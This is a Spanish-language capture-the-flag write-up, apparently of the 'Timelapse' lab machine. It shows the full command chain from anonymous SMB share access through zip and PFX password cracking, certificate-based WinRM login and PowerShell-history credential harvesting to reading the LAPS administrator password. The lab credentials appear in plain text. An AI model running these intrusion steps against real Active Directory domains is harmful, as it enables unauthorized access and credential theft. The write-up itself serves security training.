SIN CREDENCIALES — Backup de WinRM en share anónimo

Se comprueba el listado de shares SMB de forma anónima.

listado de shares
smbclient -N -L //10.129.51.171/
Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share

El share Shares es accesible anónimamente. Dentro hay dos carpetas: Dev, con un winrm_backup.zip, y HelpDesk, con documentación de LAPS (dato a tener en cuenta para más adelante).

exploración del share
smbclient -N //timelapse.htb/Shares smb: \> recurse ON smb: \> ls
\Dev winrm_backup.zip \HelpDesk LAPS.x64.msi LAPS_Datasheet.docx LAPS_OperationsGuide.docx LAPS_TechnicalSpecification.docx
Backup de WinRM expuesto
winrm_backup.zip es sospechoso por el nombre — probablemente contenga un certificado usado para autenticarse por WinRM. Se descarga para analizarlo.
// 03

CRACKEO — Zip y certificado PFX protegidos

Al intentar descomprimir el zip pide contraseña. Se extrae el hash con zip2john y se crackea con john.

crackeo del zip
zip2john winrm_backup.zip > backup_hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash.txt
Contraseña del zip
La contraseña es supremelegacy. Al descomprimir aparece legacyy_dev_auth.pfx, un certificado protegido también por contraseña que no se sabe a quién pertenece.

Se extraen el certificado y la clave privada del .pfx con openssl. Al pedir contraseña, se prueba con john de la misma forma que con el zip, obteniendo thuglegacy.

extracción del certificado y la clave
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
Certificado y clave listos
Con la contraseña thuglegacy se obtienen cert.pem y key.pem, listos para autenticar por WinRM sobre SSL.
// 04

ACCESO INICIAL — WinRM con certificado

Con el certificado y la clave privada se autentica por WinRM sobre SSL.

acceso winrm con certificado
evil-winrm -i 10.129.51.171 -S -c cert.pem -k key.pem

La conexión es exitosa como el usuario legacyy.

POST-EXPLOTACIÓN — Credenciales en el historial de PowerShell

Se revisa el historial de comandos de PowerShell del usuario, guardado por PSReadLine.

Credenciales de svc_deploy filtradas
El historial deja en texto claro las credenciales svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV, usadas para probar una sesión remota de PowerShell.

Se comprueba con evil-winrm y la conexión funciona. Revisando los grupos del usuario destaca lo siguiente.

grupos de svc_deploy
whoami /all
Group Name Type SID ---------- ---- --- TIMELAPSE\LAPS_Readers Group S-1-5-21-...-2601
Miembro de LAPS_Readers
svc_deploy pertenece al grupo LAPS_Readers, lo que sugiere que puede leer la contraseña de administrador local rotada por LAPS (Local Administrator Password Solution) directamente desde LDAP.
// 06

LAPS — Lectura de la contraseña de Administrator

¿Qué es LAPS?
LAPS rota periódicamente la contraseña de la cuenta de administrador local de cada equipo del dominio y la almacena cifrada/en texto claro en un atributo LDAP del objeto ordenador (ms-Mcs-AdmPwd). Solo los miembros del grupo configurado como lectores (aquí LAPS_Readers) pueden consultarla.

Se lee la contraseña LAPS del DC con nxc.

lectura de contraseña laps
nxc ldap 10.129.51.171 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
Contraseña de Administrator
Se obtiene la contraseña del administrador local del DC: 2d3RQ2,+{5,1v;[6jT}fi6+&.

Con esta contraseña se accede por WinRM como Administrator.

acceso winrm como administrator
evil-winrm -i 10.129.51.171 -S -u 'Administrator' -p '2d3RQ2,+{5,1v;[6jT}fi6+&'

La flag esta vez está en el escritorio de otro usuario (TRX) en lugar del propio Administrador.
